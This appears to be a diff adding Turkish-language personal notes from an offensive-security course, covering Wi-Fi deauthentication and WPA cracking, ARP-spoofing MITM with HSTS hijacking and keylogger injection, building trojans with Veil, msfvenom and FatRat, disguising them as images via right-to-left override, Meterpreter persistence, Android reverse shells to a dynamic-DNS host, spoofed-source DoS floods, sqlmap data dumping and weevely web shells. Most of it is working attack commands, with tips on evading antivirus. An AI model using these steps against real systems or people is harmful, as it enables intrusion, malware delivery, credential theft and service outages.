+6- gedit bir not defteri uygulamasıdır. gedit deneme.txt gibi bir kullanım ile yeni dosya oluşturulabilir
+
+7- DNS değiştirme ayarları için önce /etc/dhcp/dhclient.conf dosyasını buluruz
+   - dosyanın içerisinde yorum satırında bulunan prepend domain-name-servers D.N.S; satırının yorumunu kaldırıp DNS kısmını değiştiririz
+
+	Not: Kullanacağıcımız DNS'lerden biri Cloudflare DNS'idir. prepend domain-name-servers 1.0.0.1 , 1.1.1.1; yapıp kaydedersek DNS değişecektir. (Yinede intertten kontrol et DNS'i)
+
+	Not: Son olarak /etc/resolv.conf dosyasının içini kontrol ederiz değişmemiş ise
+	     text editörü(gedit,leafpad,nano) ile içini açıp DNS'i değiştiririz
+		
+		" nameserver 1.0.0.1
+		  nameserver 1.1.1.1 "
+
+	Önemli Not: Bu tip ayarlar sanal makine her açıldığında sıfırlanacaktır sıfırlanmaması için
+		    chattr -a /etc/resolv.conf  +  chattr -i /etc/resolv.conf komutları kalıcılığı kaldırır ve değişime izin verir --> -a açılmaya izin verir , -i değiştirmeye izin verir, +i değiştirelemez yapar
+		    chattr +i /etc/resolv.conf komutu ile de tekrardan kalıcılığı sağlanır
+
+
+8- VPN olarak vpnbook sitesinden openvpn kullanacağız server şifreleri sitede mevcut ve şifreler 1-2 gün içinde yenilenir yani yeniden yükleme gereklidir
+
+	Kullanım : openvpn indirilenServerDosyası.ovpn komutu bağlantıyı sağlar ve kullanıcı adı şifreler ile vpn bağlantı işlemi tamamlanır
+
+
+9-Wifi saldırıları :
+	- MAC(Media Access Control Adress) : Fiziksel veya Donanım adresidir. 48 bit 6 oktet'den oluşur. ilk 24 bit veya 3 oktet üretici firmayı, son 24 bit ise cihazın modeli yılı üretim yeri gibi bilgileri taşır
+				     	     Cihazın IP adresi her yerden görülebilirken MAC adresi sadece aynı  ağa bağlı olan kullanıcılar tarafından görüntülenebilir. GEnellikle Bluetooth Wifi Ethernet protokolleri için kullanılır
+				      	     Aynı ağ üzerindeki cihazların birbirini tanıması , router gibi aygıtların doğru bağlantı sağlaması için MAC adresi kullanılır.
+
+
+	- MAC adresi değiştirme : MAC adresi değiştirmenin önemi saldırı yapıldığında bu adres üzerinden saldırgana ulaşılabilme ihtimalidir. Bu MAC adresi belirli aralıklarda değiştirilmelidir
+
+		-MAC adresimizi ifconfig yazdığımızda ekrana çıkan wlan0 kısmında bulabiliriz. (diğer interfaceler de kullanılabilir)
+		- Bu adresi değiştirmek için önce "ifconfig wlan0 down" diyerek kapatıyoruz
+		- macchanger isimli program ile mac adresi değiştirilir.
+		- macchanger -r wlan0 diyerek mac adresi random olarak atanır
+		- ifconfig wlan0 up diyerek wlan0 yeniden başlatılır
+	
+		Not: macchanger --mac MACadres eth0,wlan0 tarzı bir komut ile elle belirlenebilir
+		Not: macchanger -p eth0(iFace) komuutu ile ise mac adresi orjinale döner
+
+	=======================================================
+
+	 Monitor Mod : Monitor mod kablosuz bir ağ arayüz denetleyicisine sahip bir bilgisayarın kablosuz bir kanalda alınan tüm trafiğin izlenmesini sağlar. Önce bir erişim noktası ve özel bir ağla ilişkilendirmek zorunda kalınmadan paketlerin yakalanmasına izin verir
+		  	İzleme modu yalnızca kablosuz ağlar için geçerlidir. Kısaca herhangi bir kablosuz ağa bağlanmadan pasif olarak bütün paketlerin izlenmesini sağlayan moddur
+	
+		- İzleme Modu Kullanımları : Coğrafi paket analizi, yaaygın trafiğin izlenmesi ve wifi teknolojisi bilgisinin edinilmesi.
+	========================================================
+
+	- Monitor Moda Geçiş : 
+
+		- airmon-ng kullanılır
+		- airmon-ng start wlan0 ile monitor moda geçilir.
+		- wlan0 wlan0mon'a dönüşür
+		-Wifileri izlemek için airodump-ng kullanılır
+		- airodump-ng wlan0mon ile çevredeki wifiler listelenir
+		- Burada bize MAC adresini(BSSID) ,uzaklığı(PWR), yoğunluğu(#Data), kanalları(CH), GüvenlikProtokolTİpini(ENC) gösterir.
+
+	=========================================================
+
+	- Belirli Bir Ağı İzleme :
+
+		- Monitor moda geçilip bilgiler alındıktan sonra oradan çıkılır
+		- "airodump-ng --channel (CH) --bssid (BSSİD) wlan0mon" komutu sonrasında bağlanılacak ağın bilgileri verilir ve bağlanılır
+		- Ağa bağlandığımızda ağda bağlı olan cihazları görürüz.
+		- Frame'ler veri akışını simgeler
+
+		Not: Sıkıntı yaşanırsa monitor mod açılıp kapatılır (airmon-ng stop wlan0mon)
+	=========================================================
+
+	 Deauth saldırı = Başkalarının bağlı olduğu wifi ağına deauth paketleri gönderirsek kurbanın bağlantısı sonlanır.
+			      Bu işlem MAC adresi üzerinden yapılır.
+			      Amacı ise ağa bağlı kullanıcı bağlantısı kopunca yeniden iletişime geçerken Handshake paketini yakalamaktır
+
+	-İşlemler :
+		-Monitor moda geçilir
+		- airodump-ng ile ağlar izlenir
+		- airodump-ng --channel ? --bssid ? wlan0mon ile ağın içindeki cihazlar izlenir
+		- aireplay-ng ile diğer bir terminalden işlemler yapılacak
+		- aireplay-ng --deauth 10000?(ToplampaketSayısı) -a ModemMAcAdres(SaldırılanAğdaki bssid) -c hedefMac(station) wlan0mon kodu ile saldırı başlatılır (-c verilmese de çalışacaktır ama düşürme yüzdesi az olacaktır bütün cihaza saldırı yaptığı için)
+		- Birden fazla cihaza saldırı yapmak Wifi-Card'ı zorlayacaktır
+		
+	========================================================
+
+	-Ağdaki verileri kayıt etme : Wifi hackleme konusunda yardımı dokunacak bu olayın
+
+		- airodump-ng --channel ? --bssid ? --write dosyaAdı wlan0mon komutundaki --write ile yazım işlemlerini hallederiz
+		- kaydedilen veriler şifrelenmiş durumda olduğu için wireshark ile bakarız
+		- dosyayı wireshark ile açarız
+
+	========================================================
+
+	-Şifreleme Türleri :
+
+		WEP : Bypass edilebilir. authontacion yoktur. Xor ile anahtarı elde edilir
+		WPA : WEP'teki zafiyetlerin kaldırılmış versiyonudur.
+		WPA2 : EN güvenilir şifreleme tipidir.
+		WPA3 : Bireysel veri şifreleme kullanılabilir. VPN bağlantısı gibi düşünülebilir. Ağı dinleme izleme ve koklama imkansız olacaktır.
+
+	========================================================
+
+	-WEP şifreli internet saldırısı : Çalışma mantığı her paket alışverişi sırasında veri ile şifreyi paylaşmasıdır
+
+		-airmon-ng start wlan0
+		-airodump-ng wlan0mon -> Sonrasında bekle
+		- airodump-ng --channel ? --bssid ? --write dosyaAdı wlan0mon komutundaki --write ile yazım işlemlerini hallederiz
+		- aircrack-ng dosyaAdı-01.cap(writeİleKaydedilenDosya) -> Dosyanın içindeki şifreyi çözmeye çalışır
+
+		Not: Bu çözme durumu modem paket alışverişne devam ettiği sürece geçerlidir. Paket yoksa kendimiz oraya paket göndeririz
+
+		-airmon-ng start wlan0
+		-airodump-ng wlan0mon
+		-airodump-ng --channel ? --bssid ? --write dosyaAdı wlan0mon
+		-O işlem devam ederken yeni terminal
+		-aireplay-ng --fakeauth 0? -a ModemMac -h kendiMacimiz(ip addr ile bak wlan0MAci) wlan0mon : Sahte yetkilendirme yaparak modemle iletişime geçer.
+ 		-aircrack-ng dosyaAdı-01.cap -> İşe yaramazsa aşağıdan devam et
+		-aireplay-ng --arpreplay -b targetMOdemMAc -h kendiMAcimiz wlan0mon : Oraya paket yüklemesi yapar ve biz trafiği kaydederiz
+
+	========================================================
+
+	-WPA/WPA2 güvenlikli wifi saldırısı : WEP'teki gibi her veri transferinde şifreler paylaşılmaz. Sadece ilk bağlantıda paylaşılır buna Handshake denir.
+
+		-Monitor mod 
+		- airodump-ng wlan0mon
+		- airodump-ng --channel ? --bssid ? --write DosyaAdı wlan0mon
+		- Önce deauth saldırısı yapılıp kişi modemden atılır sonrasında ise kişi yeniden bağlanırken gerçekleşen Handshake verisi kaydedilir
+		- aireplay-ng --deauth sayı? -a modemMAc -c cihazMAc wlan0mon
+		- crunch ile wordlist oluşturulur
+		- aircrack-ng dosyaadı-01.cap -w wordlistAdı : bruteforce'u başlatır
+ 
+		 
+		
+10- Yerel Ağ Saldırıları(LAN) :
+
+	-Ağ(Network) : Bilgi ve sistem kaynaklarının farklı kullanıcılar tarafından paylaşıldığı veri aktarımını mümkün kılan ve en az 2 bilgisayarı bağlayan sistemdir.
+
+	-LAN (Yerel Ağ) : Aynı oda bina veya bölge gibi konum olarak yakın cihazların aynı haberleşme hattı ile birbirine bağlanması ile oluşan yapıdır.
+
+	-Netdiscover : Ağ taraması aracıdır. IP ve Mac adresi bilgilerini sunabilir
+
+		Kullanım :
+
+			- netdiscover -help : Bütün komutlar hakkında bilgi verir
+			- netdiscover -i eth0(Device) -r 10.0.2.0/16(range 192.168.0/16 gibi): Bize belirtilen range içindeki cihazların ıp ve mac adreslerini verir
+
+		
+		
+	- Zenmap : Nmap tabanlı bir yazılımdır. Bir kolay versiyonu olarak düşünülebilir. Bir arayüzü vardır
+
+		Kullanım :
+
+			-Target kısmına target IP veya range girilir. ÖR: 10.0.2.10 veya 10.0.2.0/24
+			-Profile kısmına ise tarama modu verilir.
+
+	- Ortadaki Adam Saldırısı(Man in the Middle Attack) : Bir bilgisayarın internet sağlayıcısına gönderdiği verileri görmek ve manipüle etmektir. İşleme mantığı ise bilgisayara kendini modem modeme ise kendini bilgisayar olarak tanıtmaktır
+
+		-Yapılış :
+
+			-arpspoof tool'u kullanılır 
+			- -i sonrasında interface yani internete bağlı olduğumuz modu veririz eth0 wlan0, wlan1 ...
+			- -t sonrasında target IP'si verilir.
+			- -r sonrasında host yani modem IP'si verilir
+			- Örnek : arpspoof -i eth0 -t 10.0.2.? -r 10.0.2.1 (Modemlerin IP'sinin son kısmı her zaman 1'dir)
+			- Saldırı yapıldıktan hedef bilgisayar modem olarak bizim cihazımızı görecektir. yani gördüğü IP yine 10.0.2.1 olacak ama MAC adresi bizim VM'imizin MAC'i olacak
+
+
+			NOt: Default olarak Kali dışarıya veri vermez bunu sağlamak için "echo 1 > /proc/sys/net/ipv4/ip_forward" diyerek gerekli izinleri sağlarız
+
+			Not: MİTM saldırılarında kişi HTTPS sitelerine girerse bunu göremeyiz. HTTP sitelerine default olarak yönlendirip oradan veri almaya çalışırız. 
+			     Eğer kişi HTTPS sitelere girmek isterse kişiyi kendi bilgisayarımıza DNS üzerinden göndererek veri almayı deneriz
+
+			Not: HSTS siteler ne yapılırsa yapılsın siteyi HTTPS olarak açan sitelerdir. MITM saldırılarında ssl strip yapılamamasını sağlar. Örn:Facebook
+			
+		-Web sunucu oluşturma :  insanlara web üzerinden yayın açıp kendi bilgisayarımız üzerinden işlem gerçekleştirmeleri için kullanırız
+
+			-Kullanım :
+			
+				- service apache2 start : Kali Linux'ta default olarak bulunan web servisi başlatırız. (İnternetten IP adresimize bakılabilir)
+				- /var/html dizininde bulunan html kodlarını değiştirerek görünen siteyi de değiştirebiliriz
+				- Kullandığımız tool'un conf dosyasından belirli siteleri kendi yayınımıza veririz. Ör : facebook.com = 10.0.2.10
+
+		-Bettercap : MİTM saldırılarında kullanılır.
+			
+			-bettercap komutu ile başlatılır.
+			- bettercap -iface eth0,wlan0... : kullanmak istediğimiz interface'i seçeriz default olarak eth0'u kullanır
+			- net.probe on : sistemdeki IP'lere ping atarak tarama yapar
+			- net.recon : net.probe'dan gelen tarama sonuçlarını düzenler
+			- net.show : Sistemdeki cihazları listeler
+			- arp.ban on : MİTM saldırısı yapıp hiçbir isteği modeme yollamaz internet akışını keser
+			- set arp.spoof.fullduplex true : Ayarları set ederiz. help arp.spoof diyerek set edilecek parametreleri söyleriz. bu ayarı true yapmamız ise hem modeme hem de target'a saldırı yapılacağını söyler
+			- set apr.spoof.targets 10.0.2.? ,  .. : targetları set ederiz 1 veya 1'den fazla IP verilebilir
+			- net.sniff on : Hedef bilgisayarın girdiği siteleri gösterir
+			- caplets.show : Bettercap ile birlikte kullanılabilecek saldırı dosyalarını listeler
+			- set arp.spoof.internal on komutu ile yaşanılan bazı sıkıntılar düzeltilebilir gerçek saldırıalr
+			
+			HSTS saldırıları için Bettercap:
+
+			- caplets.show kısmındaki hstshijack dosyası kullanılacak
+			- leafpad ile hstshijack.cap açılır
+			- set hstshijack.log kısmındaki directory yanlış ise düzeltilir (fazladan local var usr/local/share)
+			- koddaki bütün url'ler düzeltilir 
+			- payloads kısmındaki sslstrip.js directory'si silinir, sadece keylogger.js kalır
+			- encode kısmı false yapılır 
+			- targets kısmına sitenin kendisi (* kullanılarak subdomainler de alınabilir)
+			- replacements kısmına da nereye yönlendirileceği yazılır
+			-replacements kısmı kopyalanıp dns.spoof domains kısmına yazılır
+			- arp saldırısı yapılıp
+			- hstshijack/hstshijack komutu ile modül yüklenir
+
+			Not: Eğer saldırı işe yaramazsa hsts sitelerde, o zaman aynı siteye http bir site üzerinden yönlendirme yapmak gerekebilir Örn: google->facebook
+
+			-Target'ta JavaScript çalıştırma:
+				
+			- Javascript kodu yazılıp bir dosyaya kaydedilir
+			- caplets kısmına gidilip hstshijack.cap dosyasına girilir leafpad
+			- payloads kısmına gidilip yazdığımız kodun url'li girilir (aynı formatta yazmaya dikkat et)
+		
+
+
+			
+		-MITM DNS saldırıları : Mantığı kurban bir siteye istek attığında DNS serverdan gelen cevabı manipüle edip kendi istediğimiz bir IP adresine yönlendirmemizdir
+
+			-MITMF için yapılışı :
+			- service apache2 start : Web servisi açıp orayı düzenleriz (index.html)
+			- python mitmf.py -i eth0 --arp --spoof --gateaway 10.0.2.1 -- target 10.0.2.? --dns kodu çalıştırılır
+			- hangi siteyi nereye yönlendireceğimizi söylemek için MITMfmaster/config/mitm.conf dosyasına gidilir
+
+
+
+	=====================================================================================================================	
+
+
+11- Trojan :
+
+	- Veil : Trojan oluşturmak için kullanılacak olan tool'dur
+
+		Kullanım :
+
+			
+			- list : Kullanılabilecek toolları listeler,Evasion Tool'u kullanılıyor bu kurs için
+			- use  1(toolNumber) : kullanılacak tool'u seçer, sonrasında kullanılacak payload'ı "list" ile listeleyebilir ve "use number" ile kullanabiliriz
+			- kullanılacak Payload'ı seçtikten sonra verilmesi gereken parametreleri "set LHOSTS(parametreAdı) 10.0.2.?(değer)
+			- LPORT : bu ayar http payloadları için hangi porttan bağlantı kurulacağını sorar. genel olarak çok kullanılmayan 8080 portuna bağlantı sağlanır (set LPORT 8080)
+			- generate : Trojani isimlendirdikten sonra oluşturur.
+			- PROCESSORS : Dosyanın kaç işlemci gücüne sahip olacağını seçer
+			- SLEEP : Dosyanın açıldıktan kaç saniye sonra trojanın çalışacağını sorar (antivirüs programları performans için bir dosyayı sürekli incelemez)
+
+		Trojanı Dinlemek :
+
+			-msfconsole : Trojanlari yönetmek için de kullanılabilir
+			- use exploit/multi/handler : kullanılacak exploiti seçeriz
+			- set PAYLOAD windows/meterpreter/reverse_http : Kullandığımız trojan türüne göre payload'ı dinleriz
+			- set LHOST ?, set LPORT : bu ayarları trojandaki ayarlarla aynı yaparız
+			- "exploit" : portu ve ip adresini dinlemeye alır
+
+		Genel Tekrar : reverse_http için
+
+			====VEİL====
+			- use 1
+			- use ?
+			- set LHOST kendiİpmiz
+			- set LPORT : Ayarlar payload'a göre değişir
+			- generate
+			--Sonrasında veri paylaşmayan sitelerden trojanı scan ettikten sonra ayarlarla oynayarak daha az yakalanacak bir virüs yapmayı denemek bir seçenektir
+			====MSF====
+			-use exploit/multi/handler
+			-set PAYLOAD windows/meterpreter/reverse_http
+			-set LHOST ?, set LPORT
+			-exploit
+			===İletim=== : burada apache2 servisi kullanıldı. Farklı yöntemler de mevcut
+			-service apache2 start
+			-Karşıdaki kişi dosyasyı indirince msfconsole'da session başlayacaktır. Sonrası sana kalmış
+
+		Trojani Bir Görselle Birleştirmek :
+	
+			-github fakeImageExploiter programı indirilir
+			- dosyanın içindeki settings dosyasını leafpad ile açıp ayarları değiştirebiliriz
+			- "bash FakeImageExploiter.sh" komutu ile programı çalıştırırız
+			- programa trojeni veririz
+			- programa resim dosyasını veririz
+			- en son isim veririz (oluşan dosya x.jpg.exe formatında olur :D . Sonradan düzeltme detayını yazacağım)
+			- msfconsole ayarlarını isteyip kendisi bizim için dinlemeye alır
+		
+		   -Düzelmeler :
+
+			-bir siteden fotoğrafın kendisi bir ico dosyasına dönüştürülür.
+			-bu ico dosyası FakeImageExploiter'a verilir
+			-isim olayını da characters diye bir uygulamadan right to left override ile yaparız
+
+		 Dış Ağa Trojan :
+
+			-veil ile trojan oluştur(kendiİPmiz verilir whatsMyIP sonucu)
+			-msf ile dinlenirken normal kendi bilgisayar ıp'mız verilir
+			   (Burayı Anlamadım xd)
+
+		Bağlantı Sonrası Yapılacaklar :
+		
+			-sysinfo : sistem hakkında bilgi alınır
+			-ps : çalışan programlar ve dosyalar burada görünür
+			- migrate 3268?(sistem dosya pid'si) : bu işlem trojan.exe dosyasını sistem dosyasına gömer
+			- use exploit/windows/local/persistence ile session id verdiğimizde (exe-name'i windows falan yapıyoruz) bağlantımızı kalıcı yapar
+			  show advanced ile EXE::CUSTOM (var/www/html/trojan.exe)ayarına kendi trojan'ımızı veririz. Sonra "exploit"
+			- run migrate + run metsvc + run persistence -X -U -A -L %TEMP% -r 10.0.2?(vm ip) -r 8080(port) + run vnc + getsystem komutlarını çalıştırdığımızda bilgisayarı izleriz
+			- reboot : bilgisayarı resetler
+			- help ile kullanılabilecek komutları alırız
+			- download (dosya) : dosyayı indirir
+
+		Yeni Bir Trojan Aracı : FatRat
+	
+			- github thefatrat aratılıp indirilir.
+			
+			Kullanım : 
+
+				-fatrat : tool'u çalıştırır
+				- 2. seçenek ile trojan oluşturulacak
+				- sonraki seçenekler opsiyonel
+				- LHOST ve LPORT verilir
+				- 32 bit ve 64 bit seçeneklerden 32'yi seçmek daha mantıklı (64 32'yi açar ama 32 64'ü açamaz)
+				- Trojan oluşur. Görsele vs ekleyebilirsin
+				
+		IP sabitleyici :Ağ dışı Trojanda Modemimiz kapandığında tekrardan bağlantı kurmamak için yapılır
+			
+			- duckdns.org
+			- yeni dns oluştur 
+			- Linux GUI kısmını indir
+			- chmod +x duck.setup-gui.sh
+			- ./duck.setup-gui.sh
+			- dns ismini ver
+			- tokeni ver (Bu bilgiler sitede)
+			- IP sabitlenir
+			- IP güncellemek için root'ta oluşan duckdns klasöründeki duck.sh çalıştırılır
+
+
+		Android Cihazlarda Trojan :
+
+			-Bignox android emulator uygulaması olarak kullanıldığı için trojan denemelerinde de kullanılabilir
+			
+			
+			Telefona Sızma :
+
+				- msfvenom ile trojan oluşturulur
+				- msfvenom -p android/meterpreter/reverse_tcp LHOST=(asdf.duckdns.org) LPORT=4444(genelde kullanılan) -o /kaydedilecekDizin/dosyaAdı.apk
+				- msfvenom kullanımı yukarıda var.
+				- virüs oluşturulup paylaşıldıktan sonra msfconsole ile dinlemeye alınır
+				- use exploit/multi/handler
+				- set PAYLOAD android/meterpreter/reverse_tcp
+				- show options ...
+				- exploit
+				
+
+
+		Not: Oluşturduğumuz virüsleri bir websitesinde taramak işin ticaret boyutunda website bu bilgileri sattığı için anlamsızdır. Deneme sürecinde kullanılabilir			
+		
+
+
+
+12- Dos ve DDOS : 
+
+		Dos : İstemcilere hizmet edip cevap vermesi gereken sunucuların bir şekilde cevap veremeyecek hizmet veremeyecek duruma getiren saldırılardır
+		      Teknik bir olayı yoktur. Ana mantık sunucudan cevaplayacağından fazla soru sormaktır
+
+		DDos : Birden fazla cihaz veya kişiyle yapılan Dos saldırılarıdır. Botnetler bu konuda kullanılır
+		
+
+		Saldırı Yapımı :
+
+			- Saldırı ip adresi üzerinden yapıldığı için engelleme kısmında bir cihazdan istek kabul etmeden önce ip adresinin doğruluğunu kontrol etmek iyi bir yöntem.
+
+			- msfconsole açılır.
+			- use auxiliary/dos/tcp/synflood : Dos saldırısı için kullanılacak auxiliary'i seçeriz
+			- show options ile RHOST kısmına target IP'i veririz
+			- exploit : saldırı başlar
+			
+			
+		Saldırı yaparken Proxy IP kullanmak :
+
+			- hping3 Dos Ddos için kullanılan farklı bir araçtır
+			- hping3 -S <TargetIP> --spoof <Görünecek IP> : dedikten sonra saldırı başlayacaktır
+
+		TCP ve UDP iletişim : UDP'ten daha yavaştır. Verinin karşı tarafa iletildiğinden emin olduktan sonra cevap alır veya yenisini gönderir
+			      	      UDP'ten daha güvenlidir. UDP ses ve video gibi verileri göndermede daha kullanışlıdır
+
+		UDP Saldırısı :
+		
+			-nmap ile scan atılır (-sU)
+			-hping3 --udp <url.com> -p <NmapScandekiAçıkport> --flood --rand-source(IP değişimi) : UDP saldırısını başlatır
+			-Yaptığımız saldırıyı izlemek için tcpdump host <TargetIP>
+
+			Not: Boş veri filtresi olacağı için paketler bazı portlardan geçmeyecektir. paketlere veri gömmek için :
+			
+				hping3 --udp <url.com> -p <NmapScandekiAçıkport> --flood --rand-source(IP değişimi) sonrasında -E veri.txt -d <dosyaUzunluğu> deyip paketlere veri gömülür
+						
+
+			Not : Bu saldırı için altyapının gerçekten iyi olması lazım
+
+		
+		
+		DNS Dos Saldırısı :
+		
+			-Bilinmesi gereken şey bu saldırının tek bir siteyi değil Dns altında bulunan bütün siteleri etkileyeceği kısmıdır
+			- apt-get install mz ile gerekli tool indirilir. (hping3 ile de yapılabilir Dns saldırısı)
+			- DNS saldırısı 53 numaralı porttan yapılıyor genel olarak.
+			- mz -A rand(tekli mi çoklu mu saldırı yapılacak) -B <HedefIP> -t dns "q=url.com" -c paketSayısı
+			- Saldırı wireshark üzerinden takip edilebilir
+
+		Http Get Flood Saldırısı : Sayfayı sürekli yenileyerek yapılan saldırıdır. Get Flood kısmı ise form doldurarak siteyi çökertir
+
+			-httpflooder'ı yükledik
+			- perl httpflooder.pl -a GF(getFlood,SaldırıTipi) -h url.com --url <url'densonrakiDizin> -n <sayfanınAçılma sayısı> diyerek saldırıyı ayarlayıp başlatırız
+			
+
+		ICMP Dos Saldırısı : 
+
+			-ICMP : Genelde işletim sistemleri tarafından ağda bulunan cihazların durumunu tespit amaçlı kullanılan bir protokoldür
+				Hem UDP hem TCP üzerinden çalışır.
+
+			- Yapacağımız saldırının genel mantığı işletim sistemine ağda bulunan cihazları sormak ama gelen cevabı almayıp yeni sorular sormaktır
+
+			-Saldırı :
+
+				- hping3 --icmp <url> --flood --rand-source : Saldırı bitti bu kadarmış. Kod detaylarını sonra incele
+			
+			
+					
+			
+			
+
+			
+13- Python ile araç oluşturma :
+
+	
+	-herhangi bir dosya sisteminden py uzantılı dosya açılarak kodlar yazılır
+	- Kodun başına "#!/usr/bin/env python" yazarak dosyasnın python dili ile yazıldığını gösteririz
+	- "import os" ile işletim sistemi kütüphanesi eklenir
+	- 'os.system("")' içine yazdığımız bütün komutlar dosya çalıştırıldığına terminal üzerinden çalışacaktır
+		Not: figlet YAZI komutu çalıştığında içine yazılan yazı ortaya çıkacaktır
+		
+			 ____   ___  _   _ 
+			|  _ \ / _ \| | | |   Bunun gibi
+			| | | | | | | | | |
+			| |_| | |_| | |_| |
+			|____/ \___/ \___/ 
+	-Sonrasında input ve if komutları ile kullanıcıya iştediğimiz toolu kullandırtabiliriz
+		
+		Örnek : islemno=input("seçiniz") > if islemno == ? : os.system("nmap,dirb,gobuster...")
+	
+	- import py_compile kütüphanesi ile py_compile(dosyaİsmi) komutu ile dosyayı compile ederiz ve artık değiştirilemez (kodları şifreler)
+
+	-Bunun varyasyonları ile bütün tool kullanımlarını kolaylaştırmak mümkün kalanı hayal gücüne kalmış
+14- wafw00f tool'u ile güvenlik duvarı tespiti yapılır 
+		
+	Kullanım : wafw00f "url"
+
+15- nrack tool'u ile bruteforce saldırıları yapılır
+
+	Kullanım : nrack -p port(ftp,ssh..) -u userWordlist -P passWordlist IPAdresi		
+
+16- chkrootkit aracı ile RootKıt tarama işlemi yapılır.
+
+	Kullanım : chkrootkit (xd)
+
+
+	
+17- sqlmap : SQL Injection işlemlerini bizim yerimize yapan tool'dur
+
+	Kullanım : Sadece Açığa sahip olan link biliniyor ise
+
+			sqlmap -u "url" --dbs --random-agent    (url : https://www.abdfgrrtre.com/asdf.php?id=?)
+
+		   Veritabanı adına sahip isek
+			
+			sqlmap -u "url" -D dBİsmi --tables --random-agent
+
+		   Tablo adına da sahispek
+
+			sqlmap -u "url" -D dbİsmi -T tableName --columns --random-agent
+
+		   Kolon adı da varsa 
+
+			sqlmap -u "url" -D dbİsmi -T tableName -C columnName --dump --random-agent
+
+17- lynis audit system : zaafiyet analizi yapacaktır
+
+18- wpscan : Bu tool ile wordpress siteleri tararız
+
+	Kullanım : wpscan --url "url" -> Hızlı Tarama
+		   wpscan --url "url" --enumerate p -> Eklenti Tarama
+		   wpscan --url "url" --enumerate t -> Tema Tarama
+		   wpscan --url "url" --enumerate u -> Admin Kullanıcı Adı Tarama
+
+19- ike-scan : Bir IP adresinin Vpn mi gerçek mi olduğunu kontrol eder
+
+	Kullanım : ike-scan IPadres
+
+
+
+20- Web Dünyası :
+
+	bWAPP : Web Application Pentest Labtir içinde web açıklarından çoğu bulunur
+
+
+
+	Burpsuite : Web Pentestleri için kullanılan önemli bir araçtır
+
+		Çalışma Mantığı bir siteye istek atarken isteği elinde tutup inceleme yapmamızı sağlamasıdır
+
+
+21- Netcat tool'u ile belirli porttan gelen veriler dinlenebilir
+
+	Kullanım : nc -nlvp port
+
+22- Dirbuster : Gobuster veya Dirb toollarının arayüzü olan versiyonudur.
+
+
+23- weevely : Bu tool bize arka kapı açmada büyük yardımı dokunan bir araçtır
+
+	Kullanım : Dosya yüklemek için bize PHP dilinde bir dosya oluşturur
+
+		-weevely generate >password> dosyaismi.php		
+		-weevely <URL> <password> komutu ile de bize terminali verir
+
+	Not: Uzantı üzerinden kontrol yapan sistemleri atlatmak için dosya uzantısı değiştirilir
+		
+		- cp dosya.php dosya.php3 gibi bir örnekle bunu kullanabiliriz
+
+24- commix : OSCI açığında bizim yerimize arama yapan bir tool'dur 
+
+		Kullanım : commix --url="<url>" --cookie="<burpCookie>" --data="<yapmakİstenenİŞlem>"
+			url="alibaba.com?" burpCookie ="security_level=1; PHPSESSID=213123123123123123" işlem = target=asdsada.com&form=submit
+
+25- SSI : Server Side Includes olarak geçer. Web uygulamalarında veya sayfalarında static yapılı sayfalara dinamik içerik eklemenizi sağlayan bir yapıdır
+
+		Bütün indexlere aynı kodu eklemeye yarar.
+
+26- dotdotpwn : Directory Traversal Açıklarını tarayan bir tooldur
+
+	Kullanım : dotdotpwn -m http(modül) -h url
+
+27- XSS (Cross Site Scripting) : Geliştiricinin kullanıcıdan aldığı girdileri gerekli html ve js filtrelerinden geçirmediği takdirde oluşan bir zaafiyettir
+				 Bu durumda eğer kullanıcı aynı zamanda bir saldırgan ise diğer kullanıcılara veya doğrudan sisteme zarar verebilecek kodları çalıştırabilir
+				 3 farklı dalda incelenir
+
+		a. Reflected XSS : Kullanıcıdan alınan herhangi bir girdinin doğrudan ekrana basıldığı durumlarda rastlanır. Kullanıcıdan girdi olarak alınan kod veritabanına yazılmadığı için
+				   sadece 1 defa çağrıldığında çalışır
+		b. DOM-Based XSS
+		c. Stored XSS : Kullanıcıdan alınan girdi veritabanına işlenirse veya kayıt edilirse kalıcı olarak sistemin etkilendiği açık türüdür. En tehlikeli XSS budur
+		
+28- XSRF (Cross Site Request Forgery) : XSRF ile websitesinin güvendiği bir kullanıcı üzerinden izin verilmeyen komutlar gönderilir.
+
+
+	Yapılış: Burpsuite kullanırken yapılan işlem uid içeriyor ise uid'yi admin numarası ile 1 ile değiştirip sisteme admin olarak giriş yapılabilir
+
+
+
+NOT : metasploitable2 zafiyetleri web taramaları düzeltim komutu :
+
+		- sudo nano /var/www/mutillidae/config.inc + msfadmin : şifre
+		- dosyanın içindeki db ismini owasp10 yap
+
+29- BruteForce saldırısı :
+
+
+	-BurpSuite ile yapılışı : Bir giriş paneline istek atmadan önce burp ile inceler ve onu "send to Intruder" komutu ile saldırı yerine göndeririz
+				 -payloads kısmına gelip  wordlist'i ekleyebiliriz
+				 - options kısmında bazı ayarları yapıp saldırıyı başlatabiliriz
+
+			Not: Sniper modu sadece uname veya şifre içindir. Bir tanesi bilinmesi gerekir
+			Not:  Cluster Bomb modu ise her ikisi içindir. Payloadslarda ise 2 tane seçim yapılır
+
+30- Pasif Bilgi Toplama :
+
+	- whois "url" : Dns mail numara adres gibi site bilgilerini verir. İp adresi ile tarama yapılırsa sunuucu ile ilgili bilgi alınabilir
+	- ping "url" : Sitenin sunucu ip adresini verir
+	- robtex.com sitesinden de url,ip gibi taramalar yapılabilir bir site için
+	- bing üzerinden sunucu ip'si vererek arama yaparsak sunucuyla bağlantılı diğer siteleri de gösterir
+	- 4. Maddede theHarvester açıklaması var
+	- msfconsole + use auxiliary/gather/search_email_collector + show options + set DOMAIN <url> + exploit komutları ile bilgi toplayabilriiz
+	- web.archive.org sitesinden <url> vererek sitenin geçmişi ile ilgili bilgilere ulaşabiliriz
+	- pipl.com ile isim,mail,telefonNO gibi bilgilerden bazı bilgilere ulaşabiliriz(Artık ulaşılamıyor)
+	- sitedigger programı yüklenirse sitedeki zafiyetli oalbilecek noktaları bizim için arar
+
+31- Aktif Bilgi Toplama :
+
+	- tcptraceroute / traceroute <IP> : bu komutlarla ilgili ağ haritası çıkartılabilir
+	- wafw00f <httpUrl> : Güvenlik duvarı taraması yapar
+	- nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.uri=/test.php.vulnweb.com/artists.php" <Site,IP?>
+		Güvenlik duvarı taramasını nmap ile yapar
+
+	-nmap -sS -sV -n -v -Pn <IP,url> -p 21 : Güvenlik duvarı tespiti yapar
+
+	Not: Eğer 161 numaralı snmp portu açıksa o porta msf'den use/auxiliary/scanner/snmp/snmp_login VEYA snmp_enum + show OPTIONS sonrasında RHOST ayarını yapıp exploit edebilriiz
+ 
